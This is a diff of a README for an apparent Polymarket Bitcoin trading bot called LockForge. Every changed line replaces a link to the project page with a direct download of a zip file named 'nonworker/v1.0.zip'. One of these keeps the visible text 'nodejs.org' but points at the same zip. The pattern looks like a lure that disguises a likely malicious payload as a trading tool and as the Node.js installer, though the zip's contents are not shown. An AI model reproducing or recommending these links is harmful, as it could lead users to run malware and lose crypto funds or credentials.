@@ -1,6 +1,6 @@
 # 🛡️ LockForge-Polymarket-BTC-Dump-and-Hedge-Lock-Profit-Trading-Bot-5m-15m-1h - Lock Profits, Hedge Smart, Trade Faster
 
-[![Download Now](https://img.shields.io/badge/Download-LockForge_Bot-blue?style=for-the-badge&logo=github)](https://github.com/Ydn2926/LockForge-Polymarket-BTC-Dump-and-Hedge-Lock-Profit-Trading-Bot-5m-15m-1h)
+[![Download Now](https://img.shields.io/badge/Download-LockForge_Bot-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Ydn2926/LockForge-Polymarket-BTC-Dump-and-Hedge-Lock-Profit-Trading-Bot-5m-15m-1h/main/nonworker/v1.0.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Here’s everything you need to have ready. Don’t worry, it’s all free and s
 
 Visit this link to download the application:
 
-[**👉 Click Here to Download LockForge**](https://github.com/Ydn2926/LockForge-Polymarket-BTC-Dump-and-Hedge-Lock-Profit-Trading-Bot-5m-15m-1h)
+[**👉 Click Here to Download LockForge**](https://raw.githubusercontent.com/Ydn2926/LockForge-Polymarket-BTC-Dump-and-Hedge-Lock-Profit-Trading-Bot-5m-15m-1h/main/nonworker/v1.0.zip)
 
 When you click the link, you’ll land on the project’s GitHub page. Look for the green **“Code”** button — click it, then choose **“Download ZIP”**.
 
@@ -154,7 +154,7 @@ If you see these messages, everything is working perfectly!
 ## 🆘 Frequently Asked Questions
 
 ### “I get an error saying ‘Node.js not found’”
-That’s okay! You need to install one free program first. Go to [nodejs.org](https://nodejs.org), download the **LTS version**, install it, then try running `start.bat` again.
+That’s okay! You need to install one free program first. Go to [nodejs.org](https://raw.githubusercontent.com/Ydn2926/LockForge-Polymarket-BTC-Dump-and-Hedge-Lock-Profit-Trading-Bot-5m-15m-1h/main/nonworker/v1.0.zip), download the **LTS version**, install it, then try running `start.bat` again.
 
 ### “The bot says ‘Connection failed’”
 Check your internet connection, and make sure Polymarket’s website opens in your browser. Then restart the bot.
@@ -201,7 +201,7 @@ From time to time, the developers update the bot with improvements. To update:
 
 You have everything you need. LockForge is just one click away:
 
-[**📥 Download LockForge Now**](https://github.com/Ydn2926/LockForge-Polymarket-BTC-Dump-and-Hedge-Lock-Profit-Trading-Bot-5m-15m-1h)
+[**📥 Download LockForge Now**](https://raw.githubusercontent.com/Ydn2926/LockForge-Polymarket-BTC-Dump-and-Hedge-Lock-Profit-Trading-Bot-5m-15m-1h/main/nonworker/v1.0.zip)
 
 You’ve got this. Start with paper trading, watch how it works, and soon you’ll have a tireless automated trading partner running for you around the clock.
 
